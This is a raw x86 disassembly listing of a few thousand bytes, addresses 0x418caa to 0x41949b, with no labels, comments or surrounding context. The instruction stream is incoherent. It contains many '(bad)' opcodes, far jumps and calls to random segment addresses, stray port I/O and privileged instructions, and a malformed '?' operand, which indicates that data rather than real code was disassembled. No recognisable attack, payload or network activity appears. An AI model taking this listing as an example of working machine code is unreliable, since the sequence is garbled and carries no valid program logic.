  418caa:	mov    fs,WORD PTR [eax+0x18]
  418cad:	std    
  418cae:	call   0xf7ff6052
  418cb3:	loop   0x418c72
  418cb5:	lock sbb eax,0x8e410a30
  418cbb:	pop    esi
  418cbc:	jecxz  0x418d25
  418cbe:	inc    ebp
  418cbf:	bound  esp,QWORD PTR [esi]
  418cc1:	and    dl,ah
  418cc3:	outs   dx,BYTE PTR ds:[esi]
  418cc4:	stc    
  418cc5:	mov    ch,0x90
  418cc7:	pop    ds
  418cc8:	aaa    
  418cc9:	pop    edx
  418cca:	cmp    DWORD PTR [bx+di-0x3c36],edi
  418ccf:	retf   
  418cd0:	push   ebp
  418cd1:	push   edx
  418cd2:	scas   al,BYTE PTR es:[edi]
  418cd3:	add    dh,BYTE PTR [ecx+edx*1+0x73d02ee8]
  418cda:	mul    BYTE PTR [esi-0x6e]
  418cdd:	nop
  418cde:	in     al,0xaa
  418ce0:	jle    0x418d37
  418ce2:	lods   eax,DWORD PTR ds:[esi]
  418ce3:	(bad)  
  418ce4:	call   0xeccf:0xd9081509
  418ceb:	ins    DWORD PTR es:[edi],dx
  418cec:	or     ecx,DWORD PTR [esi-0x26]
  418cef:	loope  0x418cf0
  418cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cf2:	mov    eax,ds:0xab9fa01d
  418cf7:	mov    ah,0xed
  418cf9:	aas    
  418cfa:	(bad)  
  418cfb:	push   ebp
  418cfc:	pop    ecx
  418cfd:	cs push ebx
  418cff:	mov    al,0x3b
  418d01:	mov    bh,0xc3
  418d03:	pusha  
  418d04:	mov    DWORD PTR [ebx],0x6e05300f
  418d0a:	sbb    dh,BYTE PTR [esi-0x69]
  418d0d:	in     al,0x73
  418d0f:	xchg   edx,eax
  418d10:	into   
  418d11:	fidiv  DWORD PTR [edx+0x3b]
  418d14:	pop    ds
  418d15:	pusha  
  418d16:	pop    eax
  418d17:	add    al,0x28
  418d19:	loopne 0x418cfa
  418d1b:	cli    
  418d1c:	leave  
  418d1d:	jnp    0x418cc7
  418d1f:	rcr    BYTE PTR [esi-0x40e7bc87],cl
  418d25:	xchg   esi,eax
  418d26:	shl    ebp,0x2a
  418d29:	shr    bh,cl
  418d2b:	repnz sub al,0x22
  418d2e:	test   eax,0x1cda00a0
  418d33:	lea    esp,[eax+0xb0d6bea]
  418d39:	adc    ah,0xff
  418d3c:	jo     0x418da8
  418d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d3f:	xor    eax,0xf7eee81a
  418d44:	pop    es
  418d45:	es xor al,0x9c
  418d48:	popf   
  418d49:	xchg   DWORD PTR [ecx+0x591b5b9f],esi
  418d4f:	les    ebx,FWORD PTR [edi+0x5]
  418d52:	jae    0x418d05
  418d54:	mov    edi,0x93aa6e5a
  418d59:	dec    eax
  418d5a:	mov    esp,0x79eccf43
  418d5f:	push   esp
  418d60:	dec    ebp
  418d61:	scas   eax,DWORD PTR es:[edi]
  418d62:	dec    ebx
  418d63:	sub    DWORD PTR [ebp+0x5b],edi
  418d66:	fistp  QWORD PTR [esi]
  418d68:	mov    BYTE PTR [eax-0x25],cl
  418d6b:	fsub   QWORD PTR [edx-0x6ed4281b]
  418d71:	imul   ebp,DWORD PTR [ebp+0xfa23b6e],0x1f1de681
  418d7b:	outs   dx,BYTE PTR ds:[esi]
  418d7c:	(bad)  
  418d7d:	cmc    
  418d7e:	jle    0x418dd5
  418d80:	call   0x902783dd
  418d85:	cmp    al,0xfa
  418d87:	xchg   ebp,eax
  418d88:	and    al,0xc0
  418d8a:	lock ret 0xc5eb
  418d8e:	jg     0x418d7a
  418d90:	jb     0x418dbb
  418d92:	loop   0x418d6d
  418d94:	push   ss
  418d95:	jmp    0xeecd3def
  418d9a:	daa    
  418d9b:	sub    ch,bl
  418d9d:	add    al,0x58
  418d9f:	cwde   
  418da0:	ficomp WORD PTR [ecx-0x7c]
  418da3:	and    bl,BYTE PTR [ebx]
  418da5:	add    esi,esi
  418da7:	push   eax
  418da8:	lock out 0x7e,eax
  418dab:	xor    DWORD PTR [edi-0x4e4a36c4],ebp
  418db1:	adc    al,0x4d
  418db3:	adc    eax,DWORD PTR [esi-0x2d]
  418db6:	and    cl,al
  418db8:	outs   dx,DWORD PTR ds:[esi]
  418db9:	data16 sbb BYTE PTR [ebp-0x1c],al
  418dbd:	add    BYTE PTR [ecx],al
  418dbf:	inc    esi
  418dc0:	cs jnp 0x418de9
  418dc3:	jge    0x418e08
  418dc5:	add    al,0x86
  418dc7:	std    
  418dc8:	jns    0x418d74
  418dca:	das    
  418dcb:	cs or  eax,0xa1bf0c2
  418dd1:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  418dd3:	pop    edx
  418dd4:	loope  0x418ddf
  418dd6:	xchg   esi,eax
  418dd7:	imul   ebp,DWORD PTR [ebp-0x7f],0xa0ca28c8
  418dde:	xchg   edx,eax
  418ddf:	out    dx,al
  418de0:	mov    dh,0xb6
  418de2:	or     al,0x5d
  418de4:	(bad)  
  418de5:	fidivr DWORD PTR [ebx-0x51]
  418de8:	add    BYTE PTR [edi+0x4939b8dd],cl
  418dee:	jmp    0xc7980cf6
  418df3:	outs   dx,BYTE PTR ds:[esi]
  418df4:	retf   0x6a8d
  418df7:	pop    eax
  418df8:	mov    dh,0x67
  418dfa:	ret    0xe695
  418dfd:	popa   
  418dfe:	xor    al,0xfc
  418e00:	lea    esi,[edx-0x6f]
  418e03:	leave  
  418e04:	stc    
  418e05:	pop    ecx
  418e06:	dec    eax
  418e07:	sub    DWORD PTR [ecx+0x65],0xfca3c1e8
  418e0e:	adc    esi,DWORD PTR [ecx-0x453f7cf7]
  418e14:	bound  ebx,QWORD PTR [esi]
  418e16:	jo     0x418d99
  418e18:	popa   
  418e19:	mov    ecx,0x2d346c9
  418e1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e1f:	jo     0x418e18
  418e21:	pusha  
  418e22:	pcmpeqd mm6,QWORD PTR ss:0x84c56c95
  418e2a:	repnz xchg esi,eax
  418e2c:	sub    edx,eax
  418e2e:	mov    edx,0x7ce1a7f6
  418e33:	stc    
  418e34:	dec    edi
  418e35:	daa    
  418e36:	push   ds
  418e37:	mov    ebp,0xf3ea0f5b
  418e3c:	xor    eax,0xb6c5cc3e
  418e41:	jl     0x418e2d
  418e43:	repz shl BYTE PTR [eax+ecx*4+0x30],cl
  418e48:	repz jmp 0x1627:0x5bd2a3ca
  418e50:	in     eax,0xeb
  418e52:	and    BYTE PTR [ebx+0x1],al
  418e55:	inc    esi
  418e56:	dec    ebx
  418e57:	lods   eax,DWORD PTR ds:[esi]
  418e58:	arpl   WORD PTR [edi],dx
  418e5a:	xchg   ecx,eax
  418e5b:	or     BYTE PTR [ebx-0x7b386ee2],0xd1
  418e62:	test   al,0xb0
  418e64:	daa    
  418e65:	int3   
  418e66:	aam    0x68
  418e68:	pop    esi
  418e69:	loop   0x418ec4
  418e6b:	out    0x99,eax
  418e6d:	(bad)  [eax+eax*2]
  418e70:	push   ebp
  418e71:	add    bl,0xbe
  418e74:	adc    DWORD PTR ds:[ebp+0x54],edx
  418e78:	mov    bh,0xc4
  418e7a:	pop    es
  418e7b:	lock in eax,dx
  418e7d:	lds    edx,FWORD PTR [ebx-0x19]
  418e80:	fdiv   DWORD PTR [eax]
  418e82:	and    DWORD PTR [edi],edx
  418e84:	aas    
  418e85:	cli    
  418e86:	addr16 sti 
  418e88:	xor    BYTE PTR [edi+esi*8+0x6],dh
  418e8c:	lods   eax,DWORD PTR ds:[esi]
  418e8d:	mov    DWORD PTR [ecx+0x638c6a19],ecx
  418e93:	sbb    edx,eax
  418e95:	fst    DWORD PTR [esi-0x69]
  418e98:	je     0x418e4b
  418e9a:	mov    ds:0xefdf948b,al
  418e9f:	or     ebx,edi
  418ea1:	jnp    0x418f19
  418ea3:	jne    0x418ebc
  418ea5:	int    0xd5
  418ea7:	pop    ss
  418ea8:	push   0x60
  418eaa:	imul   ebx,DWORD PTR [eax+edi*1-0x45],0x82c4765d
  418eb2:	jecxz  0x418ec2
  418eb4:	dec    esp
  418eb5:	xchg   ebp,eax
  418eb6:	retf   
  418eb7:	enter  0x2db4,0x56
  418ebb:	ret    0xf14b
  418ebe:	aam    0x3b
  418ec0:	jl     0x418e83
  418ec2:	icebp  
  418ec3:	(bad)  
  418ec4:	scas   eax,DWORD PTR es:[edi]
  418ec5:	sbb    BYTE PTR [edx],ah
  418ec7:	lds    edi,FWORD PTR [ecx]
  418ec9:	test   eax,0xc49466de
  418ece:	sbb    eax,0xe72b22f
  418ed3:	das    
  418ed4:	es call 0x24bf:0xd032ece3
  418edc:	test   BYTE PTR [ecx],cl
  418ede:	pusha  
  418edf:	popa   
  418ee0:	mov    ebx,0x252c1802
  418ee5:	cs push esi
  418ee7:	call   0xca5b5fcb
  418eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eed:	cli    
  418eee:	pop    es
  418eef:	sahf   
  418ef0:	sahf   
  418ef1:	out    dx,eax
  418ef2:	shr    BYTE PTR ds:0x47efdebb,0x1a
  418ef9:	sub    bh,BYTE PTR [eax+edi*2]
  418efc:	sbb    BYTE PTR [ecx-0x7a],dh
  418eff:	xchg   ecx,eax
  418f00:	xchg   esi,esp
  418f02:	les    edi,FWORD PTR [esp+edi*1]
  418f05:	cdq    
  418f06:	stc    
  418f07:	inc    esp
  418f08:	pusha  
  418f09:	je     0x418e97
  418f0b:	pop    ss
  418f0c:	ret    0xb285
  418f0f:	push   esi
  418f10:	in     al,dx
  418f11:	mov    esp,DWORD PTR [ebx+0x3d5e0fb8]
  418f17:	and    edx,DWORD PTR [ecx]
  418f19:	mov    edx,0xa7c9aebb
  418f1e:	enter  0x8030,0x3c
  418f22:	jno    0x418f78
  418f24:	jmp    FWORD PTR [edi+edi*2-0x1e]
  418f28:	test   DWORD PTR [eax],edx
  418f2a:	fs push esp
  418f2c:	and    eax,0x874e09e7
  418f31:	jmp    0x9f10a913
  418f36:	pop    esi
  418f37:	int    0x6b
  418f39:	xor    DWORD PTR [edi-0x2c4424c9],ebp
  418f3f:	in     eax,0x91
  418f41:	pop    ss
  418f42:	push   0x1f5ae2db
  418f47:	js     0x418ece
  418f49:	jecxz  0x418f1c
  418f4b:	adc    bh,0x6e
  418f4e:	idiv   DWORD PTR ds:0x48750898
  418f54:	sbb    al,0x8a
  418f56:	push   ss
  418f57:	or     edi,DWORD PTR [edi]
  418f59:	ins    DWORD PTR es:[edi],dx
  418f5a:	scas   al,BYTE PTR es:[edi]
  418f5b:	jmp    0xcbc5edf8
  418f60:	stos   DWORD PTR es:[edi],eax
  418f61:	test   ebx,ebp
  418f63:	push   ds
  418f64:	and    esp,DWORD PTR ds:0xabfb6cb7
  418f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f6b:	cld    
  418f6c:	in     eax,0x3c
  418f6e:	jmp    0x418fb0
  418f70:	test   BYTE PTR [ecx-0xb35bdb5],ch
  418f76:	repz mov ebp,0xfbbc9935
  418f7c:	outs   dx,DWORD PTR ds:[esi]
  418f7d:	sti    
  418f7e:	add    al,0x67
  418f80:	lock retf 0xc39b
  418f84:	sub    BYTE PTR [ecx],ah
  418f86:	repnz dec eax
  418f88:	stos   BYTE PTR es:[edi],al
  418f89:	popa   
  418f8a:	cmp    al,0x30
  418f8c:	pop    eax
  418f8d:	retf   
  418f8e:	fist   WORD PTR [edx-0x2cc8ef07]
  418f94:	xchg   DWORD PTR [esi+0x2f667c4a],esp
  418f9a:	fwait
  418f9b:	mov    ecx,0x91aaa11e
  418fa0:	xor    esp,esi
  418fa2:	pushf  
  418fa3:	ret    0xac7a
  418fa6:	xchg   BYTE PTR ds:0xf719287a,ah
  418fac:	ds push cs
  418fae:	test   BYTE PTR [edi],bl
  418fb0:	adc    al,0x68
  418fb2:	jp     0x418f37
  418fb4:	mov    edx,0x80f3dc90
  418fb9:	sub    DWORD PTR [ebp+0x67],edx
  418fbc:	pushf  
  418fbd:	sbb    al,0x4
  418fbf:	adc    DWORD PTR [ebx-0x29],eax
  418fc2:	pop    eax
  418fc3:	ss mov bl,0x4f
  418fc6:	fnsave [edi]
  418fc8:	cdq    
  418fc9:	ja     0x418ffb
  418fcb:	push   esp
  418fcc:	adc    al,0x9b
  418fce:	ins    BYTE PTR es:[edi],dx
  418fcf:	fidivr DWORD PTR ds:0xe7199a97
  418fd5:	out    dx,eax
  418fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fd7:	repz xor cl,BYTE PTR [ecx]
  418fda:	repnz lds esi,FWORD PTR [ecx*1+0xa71f71c]
  418fe2:	dec    ebx
  418fe3:	fstp   DWORD PTR [ecx-0x11c93429]
  418fe9:	call   0xcf191578
  418fee:	inc    esi
  418fef:	dec    eax
  418ff0:	les    eax,FWORD PTR [eax+0x4a6f0912]
  418ff6:	pop    edi
  418ff7:	mov    ebp,0x51daf626
  418ffc:	and    esp,DWORD PTR [esp+ebx*4]
  418fff:	sar    BYTE PTR [ecx],1
  419001:	jns    0x418f90
  419003:	adc    eax,0xde9ff8b0
  419008:	mov    ?,ebp
  41900a:	or     BYTE PTR [ebx],cl
  41900c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41900d:	pop    esi
  41900e:	ret    0x74d7
  419011:	dec    ebp
  419012:	xor    eax,0xd0d7c30a
  419017:	push   edx
  419018:	clc    
  419019:	cli    
  41901a:	push   edi
  41901b:	push   esi
  41901c:	mov    cs,esi
  41901e:	daa    
  41901f:	frndint 
  419021:	mov    bh,0x16
  419023:	push   edi
  419024:	cmp    BYTE PTR [eax],cl
  419026:	mov    ebp,0x687c5faa
  41902b:	jg     0x41907a
  41902d:	lds    eax,FWORD PTR [edx]
  41902f:	mov    eax,ds:0x66eca3d
  419034:	inc    esi
  419035:	xchg   BYTE PTR [esi+eiz*4],al
  419038:	retf   
  419039:	lahf   
  41903a:	dec    bx
  41903c:	cmp    eax,0xd8f5bf04
  419041:	add    esp,edi
  419043:	or     eax,DWORD PTR [edx]
  419045:	syscall 
  419047:	test   al,0x2c
  419049:	sub    eax,0x33b100ab
  41904e:	retf   0x5f3f
  419051:	push   edx
  419052:	sub    DWORD PTR [esp+ebp*8],esi
  419055:	test   eax,0xd206d67e
  41905a:	ret    0x5f60
  41905d:	enter  0x8b91,0x1b
  419061:	jns    0x418ff5
  419063:	jnp    0x4190a4
  419065:	jns    0x41906d
  419067:	sub    DWORD PTR [ebx],ebx
  419069:	pop    esp
  41906a:	fild   WORD PTR [edi+0x12]
  41906d:	mov    bl,0x6d
  41906f:	sub    ah,BYTE PTR [esi]
  419071:	loopne 0x41905a
  419073:	aas    
  419074:	mov    ebp,0x103ad870
  419079:	xor    ah,0xf7
  41907c:	xchg   edx,eax
  41907d:	push   eax
  41907e:	or     ah,BYTE PTR [ebx-0x6d5a1ea]
  419084:	shl    ebp,0x9f
  419087:	inc    ecx
  419088:	push   es
  419089:	jmp    0x4e8d:0x7469879a
  419090:	popf   
  419091:	mov    ah,0x33
  419093:	or     al,0xe2
  419095:	enter  0x7262,0xb0
  419099:	mov    DWORD PTR ds:0xa8dce74c,esp
  41909f:	pop    edi
  4190a0:	sub    esi,DWORD PTR [esi]
  4190a2:	sub    DWORD PTR [ebx],edi
  4190a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190a5:	mov    bl,0xd8
  4190a7:	test   dl,0x3e
  4190aa:	xchg   DWORD PTR [edx+0x1c],ecx
  4190ad:	cmc    
  4190ae:	call   0x58eedb7f
  4190b3:	xor    DWORD PTR [eax-0x46d86578],edx
  4190b9:	cmp    ah,BYTE PTR [ecx+0x57983dc5]
  4190bf:	int    0x55
  4190c1:	xor    dl,BYTE PTR [edx]
  4190c3:	xchg   esi,eax
  4190c4:	lock sbb eax,0xacb2dee5
  4190ca:	xlat   BYTE PTR ds:[ebx]
  4190cb:	scas   eax,DWORD PTR es:[edi]
  4190cc:	jl     0x4190d8
  4190ce:	pop    ebx
  4190cf:	mov    dl,0x1
  4190d1:	ja     0x4190f7
  4190d3:	mov    edi,0x54f9a4a3
  4190d8:	adc    BYTE PTR [ebx+0x45],ch
  4190db:	mov    al,0x1c
  4190dd:	xchg   BYTE PTR [eax],dh
  4190df:	data16 xor al,0x51
  4190e2:	lds    ecx,FWORD PTR [edi+0x67b8122a]
  4190e8:	hlt    
  4190e9:	sbb    eax,0x81d1c4a9
  4190ee:	or     al,ch
  4190f0:	nop
  4190f1:	cmp    ebx,DWORD PTR [eax-0x30]
  4190f4:	jecxz  0x419159
  4190f6:	fdiv   DWORD PTR [ecx]
  4190f8:	daa    
  4190f9:	mov    edx,0x53eb43b8
  4190fe:	out    dx,eax
  4190ff:	(bad)  [eax+ecx*8-0x4ccd170]
  419106:	xor    al,bl
  419108:	popf   
  419109:	mov    edx,DWORD PTR [edx+0x3a7c6cb9]
  41910f:	call   0xe50fce7f
  419114:	ret    0x60b6
  419117:	pop    ebp
  419118:	sub    DWORD PTR [esi],eax
  41911a:	jb     0x4190b7
  41911c:	pop    edi
  41911d:	xchg   ecx,eax
  41911e:	xchg   BYTE PTR es:[eax+0xd],bl
  419122:	add    al,0xd6
  419124:	cmp    al,0x90
  419126:	mov    esi,0x5d73a4ef
  41912b:	rol    BYTE PTR [edi+0x1968cc08],cl
  419131:	(bad)  
  419132:	push   esi
  419133:	lds    esp,FWORD PTR [ebx]
  419135:	(bad)  [esi-0x424b9ec4]
  41913b:	je     0x4191aa
  41913d:	push   ebx
  41913e:	retf   
  41913f:	fdivr  QWORD PTR [ecx-0x3e]
  419142:	loopne 0x419102
  419144:	xchg   edx,ebp
  419146:	inc    eax
  419147:	(bad)  
  419148:	xchg   ebp,eax
  419149:	lods   al,BYTE PTR ds:[esi]
  41914a:	pop    edx
  41914b:	ret    
  41914c:	(bad)  
  41914d:	fcom   DWORD PTR [ecx-0x3d]
  419150:	push   DWORD PTR [eax+0x5bc0f00c]
  419156:	pop    ebp
  419157:	stos   DWORD PTR es:[edi],eax
  419158:	leave  
  419159:	sbb    al,0x7c
  41915b:	test   ecx,esp
  41915d:	fild   DWORD PTR [esi+0x49382926]
  419163:	cdq    
  419164:	fcomip st,st(2)
  419166:	shl    BYTE PTR [edi],1
  419168:	mov    al,ds:0x26cc7e7e
  41916d:	call   DWORD PTR [ebx+0x7d7b0cb1]
  419173:	xor    DWORD PTR [edx+0x7dc6ecc],edx
  419179:	sbb    edx,edi
  41917b:	jmp    0x96e8:0x33e4a275
  419182:	retf   0x1c03
  419185:	sti    
  419186:	adc    al,0xe
  419188:	cmp    DWORD PTR [eax],ebp
  41918a:	mov    al,0xce
  41918c:	fwait
  41918d:	add    BYTE PTR [edi-0x80],ch
  419190:	mov    BYTE PTR [ebx+0x23230a4c],cl
  419196:	or     al,0x6d
  419198:	std    
  419199:	mov    edx,0x4fcb47bc
  41919e:	test   DWORD PTR [ecx+0x52348c62],ebx
  4191a4:	cmp    eax,0x84de6ae4
  4191a9:	cmp    eax,0x72d7fcce
  4191ae:	retf   0x8926
  4191b1:	mul    bh
  4191b3:	test   al,0x28
  4191b5:	pop    edi
  4191b6:	mov    ecx,DWORD PTR [edx-0x61]
  4191b9:	mov    dh,0xb7
  4191bb:	and    ebp,ebp
  4191bd:	xor    al,BYTE PTR [edi-0x52120d24]
  4191c3:	mov    al,0xa6
  4191c5:	xchg   edi,eax
  4191c6:	mov    esi,0xf4ecb436
  4191cb:	jmp    0x419152
  4191cd:	mov    ebx,0xff32cb93
  4191d2:	adc    BYTE PTR [ebx+eiz*2],0x81
  4191d6:	dec    ebx
  4191d7:	fs mov edx,0x5cf698f
  4191dd:	cli    
  4191de:	outs   dx,BYTE PTR ds:[esi]
  4191df:	jae    0x419184
  4191e1:	jb     0x41920b
  4191e3:	push   edi
  4191e4:	adc    ch,bl
  4191e6:	and    eax,0xd1559b70
  4191eb:	adc    dl,BYTE PTR [ecx-0x3dcb454f]
  4191f1:	ja     0x41921e
  4191f3:	mov    dh,0x4d
  4191f5:	jno    0x41925a
  4191f7:	mov    esi,0x523f3752
  4191fc:	adc    DWORD PTR [edx-0x5b900865],ecx
  419202:	je     0x4191a2
  419204:	sub    al,0xda
  419206:	jns    0x4191bc
  419208:	xchg   edi,eax
  419209:	add    BYTE PTR [ebp+0x61],0xaf
  41920d:	jge    0x419203
  41920f:	cmp    ch,cl
  419211:	jg     0x419278
  419213:	test   al,0x55
  419215:	dec    edx
  419216:	out    dx,eax
  419217:	lods   al,BYTE PTR ds:[esi]
  419218:	mov    BYTE PTR [edi+0x3146791f],bl
  41921e:	aad    0x69
  419220:	in     al,0xc
  419222:	(bad)  
  419223:	jae    0x419288
  419225:	sbb    dh,al
  419227:	addr16 pop eax
  419229:	icebp  
  41922a:	pop    ss
  41922b:	popf   
  41922c:	ret    
  41922d:	pop    edx
  41922e:	lods   eax,DWORD PTR ds:[esi]
  41922f:	loope  0x419228
  419231:	dec    edx
  419232:	shr    dh,0x49
  419235:	call   0x26b7:0x79e6f41a
  41923c:	xchg   ebp,eax
  41923d:	add    edi,ebx
  41923f:	cmp    al,0x7f
  419241:	jge    0x41921e
  419243:	lock sbb bl,BYTE PTR [eax-0x5922e0df]
  41924a:	sbb    esp,edi
  41924c:	data16 loopne 0x4192a4
  41924f:	scas   al,BYTE PTR es:[edi]
  419250:	addr16 sub eax,0x3fe5406e
  419256:	push   0xfc56dc3f
  41925b:	sub    ebx,eax
  41925d:	sub    eax,0x983f8d9c
  419262:	push   esi
  419263:	mov    WORD PTR [eax+0x77],ds
  419266:	lea    eax,[edi+0x1aeee162]
  41926c:	mov    DWORD PTR [esi-0x3b9c44ac],edi
  419272:	xor    bl,BYTE PTR [edi]
  419274:	sub    eax,0xf8f05b48
  419279:	in     al,dx
  41927a:	adc    eax,0x6f282fe7
  41927f:	fwait
  419280:	pop    ebx
  419281:	jns    0x419205
  419283:	shl    BYTE PTR [eax-0x79],cl
  419286:	out    dx,eax
  419287:	adc    bl,ah
  419289:	sbb    eax,0xe0eda794
  41928e:	add    DWORD PTR [edx+0x6767e17f],0xdaebd850
  419298:	mov    bl,0xf9
  41929a:	rcr    DWORD PTR [ebx-0x62],0x3c
  41929e:	cmc    
  41929f:	rol    BYTE PTR [ebx+0x74],cl
  4192a2:	cmp    BYTE PTR [eax+0x32797426],bl
  4192a8:	sbb    eax,0xdb1a040c
  4192ad:	dec    eax
  4192ae:	or     eax,0xcb9ed770
  4192b3:	inc    edi
  4192b4:	(bad)  
  4192b5:	loope  0x41923a
  4192b7:	(bad)  
  4192b8:	jecxz  0x419308
  4192ba:	inc    esi
  4192bb:	clc    
  4192bc:	inc    ebx
  4192bd:	cmp    al,0x19
  4192bf:	cmc    
  4192c0:	inc    eax
  4192c1:	popf   
  4192c2:	enter  0x5b0a,0x60
  4192c6:	cmp    ebp,DWORD PTR [ebp+0x52]
  4192c9:	shr    DWORD PTR [ecx-0x62],cl
  4192cc:	fisub  DWORD PTR [ecx]
  4192ce:	(bad)
  4192d2:	mov    DWORD PTR [eax],esp
  4192d4:	(bad)  
  4192d5:	std    
  4192d6:	and    edi,DWORD PTR [esi+0x13]
  4192d9:	ja     0x419289
  4192db:	fnstenv [ecx-0x62]
  4192de:	xchg   ebp,eax
  4192df:	sbb    al,0xb5
  4192e1:	inc    esi
  4192e2:	fcom   DWORD PTR [ebp-0x3c0c0d4a]
  4192e9:	dec    ecx
  4192ea:	sbb    DWORD PTR [edx-0x4672615],0xffffffde
  4192f1:	sti    
  4192f2:	out    0x66,al
  4192f4:	rol    DWORD PTR [ebx-0x6992d3e3],cl
  4192fa:	sub    dl,0xc3
  4192fd:	fistp  WORD PTR [ecx-0x3a]
  419300:	and    ebx,DWORD PTR [edx-0x34fe53d8]
  419306:	fnsave ds:0x6a500e64
  41930c:	jp     0x41931e
  41930e:	mov    esp,0x4f7bc8c
  419313:	jmp    0x4192e4
  419315:	inc    edx
  419316:	outs   dx,DWORD PTR ds:[esi]
  419317:	or     eax,0x393bb1ca
  41931c:	cwde   
  41931d:	and    ch,dl
  41931f:	or     al,0x74
  419321:	outs   dx,BYTE PTR ds:[esi]
  419322:	pop    edi
  419323:	and    eax,0x21f6999a
  419328:	out    dx,al
  419329:	lds    ebx,FWORD PTR [ebx]
  41932b:	repnz int 0x21
  41932e:	jns    0x41934a
  419330:	scas   al,BYTE PTR es:[edi]
  419331:	dec    edx
  419332:	sbb    eax,0xae2647e7
  419337:	cmp    DWORD PTR [eax-0x1c7654b2],esi
  41933d:	out    0x1f,al
  41933f:	das    
  419340:	xlat   BYTE PTR ds:[ebx]
  419341:	cwde   
  419342:	jle    0x4192c9
  419344:	add    ch,ch
  419346:	mul    BYTE PTR [edi]
  419348:	pop    ss
  419349:	cmp    eax,0x105cee59
  41934e:	jne    0x4193ab
  419350:	gs data16 jns 0x419353
  419354:	fild   DWORD PTR [edx+0x19]
  419357:	add    edi,DWORD PTR [ecx+eiz*8]
  41935a:	pop    esp
  41935b:	jg     0xd393dc89
  419361:	ds sahf 
  419363:	in     eax,dx
  419364:	data16 (bad) 
  419366:	fcmovb st,st(6)
  419368:	enter  0xc0e1,0x93
  41936c:	sbb    edx,DWORD PTR [edx+0x63]
  41936f:	sbb    BYTE PTR [edx-0x5f525023],dl
  419375:	ins    BYTE PTR es:[edi],dx
  419376:	addr16 inc eax
  419378:	xor    esp,eax
  41937a:	leave  
  41937b:	xchg   edx,eax
  41937c:	jecxz  0x4193f9
  41937e:	mov    dh,0x34
  419380:	mov    esi,0xd0d5f66
  419385:	dec    esp
  419386:	test   al,0x4c
  419388:	sub    DWORD PTR [edx-0x71],ebp
  41938b:	push   ss
  41938c:	and    BYTE PTR [esi-0x16],dl
  41938f:	leave  
  419390:	rcr    BYTE PTR [ebx],1
  419392:	out    0xfb,al
  419394:	sbb    eax,0xe1ab1e17
  419399:	rcl    eax,0x1f
  41939c:	dec    edi
  41939d:	jl     0x419345
  41939f:	fwait
  4193a0:	mov    cl,0x69
  4193a2:	mov    DWORD PTR [edi-0x3786ea3f],esi
  4193a8:	popa   
  4193a9:	cmp    bl,BYTE PTR [edi+0x60]
  4193ac:	int3   
  4193ad:	jb     0x41935c
  4193af:	out    dx,eax
  4193b0:	xchg   esp,eax
  4193b1:	in     eax,0xee
  4193b3:	ss out dx,eax
  4193b5:	inc    edi
  4193b6:	adc    esi,DWORD PTR [ebp+ebp*2-0x5d]
  4193ba:	push   ss
  4193bb:	mov    edi,0x43a3b71b
  4193c0:	cmp    al,0x16
  4193c2:	mul    edx
  4193c4:	mov    ebx,0x3085ea6b
  4193c9:	mov    al,0x93
  4193cb:	xor    ah,BYTE PTR [ebp+0x7423d00d]
  4193d1:	retf   
  4193d2:	pop    ebp
  4193d3:	mov    edi,0x96e64fe5
  4193d8:	xor    cl,al
  4193da:	stos   BYTE PTR es:[edi],al
  4193db:	jb     0x4193f5
  4193dd:	popf   
  4193de:	jne    0x41936f
  4193e0:	add    eax,0x10422fe8
  4193e5:	or     eax,0x7a84f4f9
  4193ea:	pop    edx
  4193eb:	ret    
  4193ec:	mov    al,0x6c
  4193ee:	xchg   ecx,eax
  4193ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193f0:	dec    DWORD PTR [edi]
  4193f2:	mov    esi,DWORD PTR [eax]
  4193f4:	fimul  DWORD PTR [eax]
  4193f6:	fst    QWORD PTR [esi-0x2f55638d]
  4193fc:	dec    DWORD PTR [eax+0x15]
  4193ff:	popf   
  419400:	leave  
  419401:	sub    BYTE PTR [eax+edi*8-0x52],0x5b
  419406:	pop    eax
  419407:	xor    DWORD PTR [edx+0x3beaf137],ebx
  41940d:	mov    eax,0x735bb488
  419412:	clc    
  419413:	pop    eax
  419414:	adc    bl,BYTE PTR [eax]
  419416:	mov    al,0x67
  419418:	fidiv  DWORD PTR [edx]
  41941a:	into   
  41941b:	mov    bh,0x48
  41941d:	mov    ebp,0x419bf5f8
  419422:	not    DWORD PTR [eax+0x5f4c204]
  419428:	push   ds
  419429:	pop    esi
  41942a:	push   cs
  41942b:	mov    ecx,0x4122d764
  419430:	in     eax,0xfc
  419432:	pop    esi
  419433:	push   esp
  419434:	out    dx,eax
  419435:	fst    DWORD PTR [edx-0x7d63e57]
  41943b:	mov    ebx,0x7b45736d
  419440:	pop    esi
  419441:	jae    0x4194b3
  419443:	sbb    ecx,ecx
  419445:	aaa    
  419446:	mov    cl,0xcd
  419448:	push   0xffffffca
  41944a:	or     eax,0x7e4aab98
  41944f:	push   ds
  419450:	jo     0x41946f
  419452:	xor    dh,ch
  419454:	jb     0x419478
  419456:	jmp    DWORD PTR [eax-0x7c]
  419459:	loope  0x419431
  41945b:	push   cs
  41945c:	or     DWORD PTR [eax+ecx*8+0x3524fe1f],ebp
  419463:	mov    bl,0xaa
  419465:	arpl   WORD PTR [edi],di
  419467:	xchg   esp,eax
  419468:	hlt    
  419469:	sbb    dl,ch
  41946b:	add    esi,DWORD PTR [eax+0x1b]
  41946e:	mov    bl,0xd2
  419470:	fadd   st,st(3)
  419472:	inc    edx
  419473:	aaa    
  419474:	inc    ecx
  419475:	das    
  419476:	aad    0x4a
  419478:	jmp    FWORD PTR [edx+0x57e86e3c]
  41947e:	sub    BYTE PTR [esi],dh
  419480:	into   
  419481:	arpl   WORD PTR [ebx-0x4],ax
  419484:	adc    eax,DWORD PTR [esp+eiz*4-0x21]
  419488:	int3   
  419489:	push   0x49
  41948b:	mov    ebp,0xd79db37
  419490:	cli    
  419491:	clc    
  419492:	hlt    
  419493:	mov    bl,0x16
  419495:	fcomp  DWORD PTR [eax+0x73326c1f]
  41949b:	fild   DWORD PTR [eax]
